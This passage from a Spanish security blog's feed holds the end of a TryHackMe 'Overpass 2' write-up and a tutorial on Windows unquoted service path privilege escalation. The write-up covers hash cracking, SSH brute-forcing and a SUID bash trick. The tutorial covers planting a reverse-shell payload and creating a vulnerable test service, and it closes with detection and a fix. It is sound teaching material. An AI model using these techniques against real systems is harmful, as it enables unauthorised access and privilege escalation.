+&lt;p&gt;&lt;a href=&quot;https://ibb.co/h25HBTP&quot;&gt;&lt;img src=&quot;https://i.ibb.co/7rcVn0w/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Me puse a leerlo (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Follow TCP Stream, Seguir trama TCP...&lt;/code&gt;), y lo que contenía resultó ser todo lo que pasaba por NC (netcat). Ahí se encontraba varias respuestas sobre los hashes, simplemente hay que leerlo y encuentras tanto el hash como la salt.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/kGBt4FV&quot;&gt;&lt;img src=&quot;https://i.ibb.co/Prjdc8s/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;cómo-crackear-la-contraseña-hasheada&quot;&gt;¿Cómo crackear la contraseña hasheada?&lt;/h1&gt;
+
+&lt;p&gt;Antes de seguir adelante hay que entender que un hash tiene salt.
+Por tanto,crackear el “hash” de la pregunta de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;THM&lt;/code&gt; que contestamos antes, darias error. Esto es debido a que el formato requerido para crackear es “HASH:SALT”.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/SB6n98N/hashwithsalt.png&quot; alt=&quot;hashwithsalt&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Cuando lo tengamos guardado en un fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;P.EJ: hash&lt;/code&gt; deberemos lanzar alguna herramientas para crackearla.
+En mi caso usé hashcat con la wordlist recomendada por ´´THM´´ : fasttrack.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/V2YnghZ&quot;&gt;&lt;img src=&quot;https://i.ibb.co/pJjVfs8/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;conseguir-la-flag-usertxt&quot;&gt;Conseguir la flag User.txt&lt;/h1&gt;
+
+&lt;p&gt;Primero que todo realize un escaneo de puertos con nmap. 
+El escaneo de nmap arrojó como resultado, entre otro muchos, el puerto 22 abierto.&lt;/p&gt;
+
+&lt;p&gt;Así que lo primero que se me ocurrió fue lanzar un ataque de fuerza bruta por SSH con hydra.
+En los usuarios puse todos los del fichero shadow que encontramos en el fichero Wireshark,&lt;/p&gt;
+
+&lt;h1 id=&quot;conseguir-la-flag-roottxt&quot;&gt;Conseguir la flag root.txt&lt;/h1&gt;
+
+&lt;p&gt;Al entrar como user , comprobe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;ls -la&quot;.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Encontre el fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;.suid_bash&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Intente leerlo pero era ilegible, pero si nos penemos a pensar en la situación,el atacante puede haber dejado algun archivo para escalar privilegios facilmente, (se sobreentiende por el nombre del fichero y el contexto de la maquina de TryHackMe)&lt;/p&gt;
+
+&lt;p&gt;Ejecutamos el ficheros, comprobamos permisos, y vemos que nada ha pasado , seguimos teniendo el euid de James ( se comprueba con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;), aunque el prompt cambio. Esto nos confirma que el script está jugando con la shell y los permisos…&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/0hZ3gf5&quot;&gt;&lt;img src=&quot;https://i.ibb.co/SR0phKS/suid-james.png&quot; alt=&quot;suid-james&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Por suerte se me ocurrió probar con la flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; (para mantener los permisos de ejecuccion del script) y funcionó.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/27sVtFB&quot;&gt;&lt;img src=&quot;https://i.ibb.co/VWQnSL8/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Como vemos se nos mantuvo el&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;euid=0&lt;/code&gt;, que corresponde a root, aunque seguimos siendo james, tenemos permisos de root.&lt;/p&gt;
+
+&lt;p&gt;Por tanto ya solo nos queda sacar la flag de root:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://imgbb.com/&quot;&gt;&lt;img src=&quot;https://i.ibb.co/XjB9sdp/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;agradecimientos&quot;&gt;Agradecimientos&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=XtySdRYCbiY&quot;&gt;John Hammond (TryHackMe! Overpass 2 Recovering from THE HACK)&lt;/a&gt;&lt;/p&gt;</content><author><name>Diego Martín dos Santos</name></author><category term="tryhackme," /><category term="wireshark" /><summary type="html">Máquina TryHackMe: Overpass 2</summary></entry><entry><title type="html">Vulnerabilidad: Unquoted Service Path</title><link href="http://localhost:4000/2021/03/24/Unquoted-Service-Path.html" rel="alternate" type="text/html" title="Vulnerabilidad: Unquoted Service Path" /><published>2021-03-24T00:00:00+01:00</published><updated>2021-03-24T00:00:00+01:00</updated><id>http://localhost:4000/2021/03/24/Unquoted%20Service%20Path</id><content type="html" xml:base="http://localhost:4000/2021/03/24/Unquoted-Service-Path.html">&lt;h1 id=&quot;requisitos&quot;&gt;Requisitos&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Disponer de alguna forma de subir archivos , ya sea o bien teniendo una shell (Netcat, Meterpreter, etc…) o bien tener alguna forma de subir ficheros, ya sea RFI o LFI,o como sea que hayais vulnerado la máquina en la que quereís escalar privilegios.&lt;/li&gt;
+  &lt;li&gt;Si la shell es de un usuario sin privilegios,nos bastaría con poder subir (si no se pueden subir ficheros, pero si crearlos, podría funcionar si somos capaces de crear un ejecutable completamente funcional, sin necesidad de ejecutarlo)&lt;/li&gt;
+  &lt;li&gt;Tener en la máquina que estamos atacando un servicio el cual ejecuta un fichero. Este fichero puede ser, o bien ejecutado cada cierto tiempo ,o bien un proceso/servicio que se active con cierto evento/trigger.(EJ: Iniciar sesión.)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;explicación-de-la-vulnerabilidad-con-pseudocódigo&quot;&gt;Explicación de la vulnerabilidad con pseudocódigo&lt;/h1&gt;
+
+&lt;p&gt;En este fragmento de código podemos ver como, la función proceso ( que simula un servicio que se ejecuta periodicamente ) ejecuta ruta:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;servicio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;  
+  &lt;span class=&quot;n&quot;&gt;ejecutar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C:\CARPETA UNO\CARPETA DOS\CARPETA TRES\sql.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+  &lt;span class=&quot;c1&quot;&gt;#El proceso quiere ejecutar la 
+&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;#ruta &quot;C:\CARPETA UNO\CARPETA DOS\CARPETA TRES\sql.exe&quot; (con comillas)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En este caso, al estar la ruta con comillas, no importa que tenga espacios, puesto que es una String.
+Por tanto el servicio que se ejecuta periodicamente ejecutara sin problemas “C:\CARPETA UNO\CARPETA DOS\CARPETA TRES\sql.exe”.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;servicio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;  
+  &lt;span class=&quot;n&quot;&gt;ejecutar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;CARPETA&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UNO&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;CARPETA&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DOS&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;CARPETA&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRES&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+  &lt;span class=&quot;c1&quot;&gt;#El proceso quiere ejecutar la 
+&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;#ruta C:\CARPETA UNO\CARPETA DOS\CARPETA TRES\sql.exe (sin comillas)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;En este otro fragmento de código podemos ver como la función servicio ejecuta la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\CARPETA UNO\CARPETA DOS\CARPETA TRES\sql.exe&lt;/code&gt; , (vease que no lleva comillas)&lt;/p&gt;
+
+&lt;h1 id=&quot;cómo-ejecutará-esto-windows&quot;&gt;¿Cómo ejecutará esto Windows?&lt;/h1&gt;
+
+&lt;p&gt;Buscará subdirectorio por subdirectorio hasta dar con el fichero que busca(sql.exe). Es decir, que si encuentra el fichero antes, usará ese fichero y dejará de buscarlo.
+Pero hay que analizar muy bien la ruta , puesto que , al ser una vulnerabilidad(ERROR) , las rutas que ira comprobando no son muy normales, o intuitivas.&lt;/p&gt;
+
+&lt;p&gt;Por tanto, si la ruta del ejecutable que se esta ejecutando es: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\CARPETA UNO\CARPETA DOS\CARPETA TRES\sql.exe&lt;/code&gt; , será recorrida de la siguiente manera:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;&quot;C:\PRIMERA.exe&quot;
+&quot;C:\PRIMERA CARPETA/segunda.exe&quot;
+&quot;C:\PRIMERA CARPETA/SEGUNDA CARPETA/tercera.exe&quot;
+&quot;C:\PRIMERA CARPETA/SEGUNDA CARPETA/TERCERA CARPETA/sql.exe&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&quot;-explotación-de-la-vulnerabilidad&quot;&gt;&lt;i class=&quot;fas fa-bomb&quot;&gt;&lt;/i&gt; Explotación de la vulnerabilidad&lt;/h1&gt;
+
+&lt;p&gt;Por tanto, visto lo anteriormente , y si cumplimos las condiciones previamente citadas, si colocamos por ejemplo un payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;segunda.exe&lt;/code&gt; hecho en powershell/cmd en una ruta previa a la ruta final , vease:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;&quot;C:\PRIMERA CARPETA/segunda.exe&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;…siendo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;segunda.exe&lt;/code&gt; nuestro payload/reverse shell o lo que queraís ejecutar como administrador,
+conseguiremos una reverse shell (en este ejemplo) como administrador (o el usuario que este ejecutando el servicio/tarea).&lt;/p&gt;
+
+&lt;h1 id=&quot;-creacion-de-un-payload-en-msfvenom&quot;&gt;&lt;i class=&quot;fas fa-bomb&quot;&gt;&lt;/i&gt; Creacion de un payload en Msfvenom&lt;/h1&gt;
+
+&lt;p&gt;La creación del payload y del listener pueden hacerse de manera manual, es recomendable hacerlo aunque sea más díficil si se quiere aprender, pero aqui usaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;metasploit&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; para facilitar que se entienda el proceso.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/QnJWCjJ&quot;&gt;&lt;img src=&quot;https://i.ibb.co/d6fNLJf/ups-msfvenom.png&quot; alt=&quot;ups-msfvenom&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;-poniendonos-a-la-escucha-con-metasploit&quot;&gt;&lt;i class=&quot;fas fa-headphones-alt&quot;&gt;&lt;/i&gt; Poniendonos a la escucha con Metasploit&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/kgH8tFy&quot;&gt;&lt;img src=&quot;https://i.ibb.co/XZ2sqT4/MSFCONSOLE-ESCUCHAR.png&quot; alt=&quot;MSFCONSOLE-ESCUCHAR&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://ibb.co/0yh4qJj&quot;&gt;&lt;img src=&quot;https://i.ibb.co/xqJ9h5S/EXPLOIT.png&quot; alt=&quot;EXPLOIT&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;creación-de-esta-vulnerabilidad-para-testear-en-entornos-controlados&quot;&gt;Creación de esta vulnerabilidad para testear en entornos controlados…&lt;/h1&gt;
+&lt;p&gt;Si queremos probar esta vulnerabilidad,podemos crear un servido llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SERVICIOVULNERABLE&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;sc create SERVICIOVULNERABLE start= auto binPath= &quot;C:\PRIMERA CARPETA\SEGUNDA CARPETA\TERCERA CARPETA\sql.exe&quot; DisplayName= SERVICIOVULNERABLE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/8rvBh6B&quot;&gt;&lt;img src=&quot;https://i.ibb.co/m9ZBx6B/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;NOTA: Las comillas son necesaria para el uso del comando, pero la creación se esta llevando a cabo sin comillas, se puede comprobar con el siguiente comando,el cúal nos mostrara todos los procesos con rutas sin entrecomillar:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;wmic service get name,displayname,pathname,startmode |findstr /i /v “C:\Windows\\” | findstr /i /v “””
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;a href=&quot;https://ibb.co/r2ZF9gG&quot;&gt;&lt;img src=&quot;https://i.ibb.co/4RjKkcZ/image.png&quot; alt=&quot;image&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;
+Para simular que se ejecuta de manera periodica podemos simplemente encender , parar y reiniciar,respectivamente,el servicio :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;net start SERVICIOVULNERABLE
+net stop SERVICIOVULNERABLE
+net restart SERVICIOVULNERABLE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&quot;-cómo-protegernos-de-esta-vulnerabilidad&quot;&gt;&lt;i class=&quot;fas fa-shield-alt&quot;&gt;&lt;/i&gt; ¿Cómo protegernos de esta vulnerabilidad?&lt;/h1&gt;
+
+&lt;p&gt;Para protegernos de esta vulnerabilidad,simplemente tenemos que añadir comillas a nuestra rutas.
+Al crear servicios, si queremos que estos sean seguros, hay que jugar con los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slash&lt;/code&gt; para introducir comillas dentro de las comillas del propio comando,por ejemplo:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;sc create ServicioNoVulnerable start= auto binPath= &quot;\&quot;RUTA\DEL\SERVICIO/EJECUTABLE&quot;\&quot; DisplayName= ServicioNoVulnerable
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&quot;agradecimientos&quot;&gt;Agradecimientos&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae&quot;&gt;Sumit Verma con su post “Windows Privilege Escalation — Part 1 (Unquoted Service Path)”&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://hackmd.io/@EvilOrez/unquotedservices&quot;&gt;@EvilOrez con su Post “MICROSOFT’S UNQUOTED SERVICES”&lt;/a&gt;&lt;/p&gt;</content><author><name>Diego Martín dos Santos</name></author><category term="vulnerabilidad" /><summary type="html">Requisitos</summary></entry></feed>
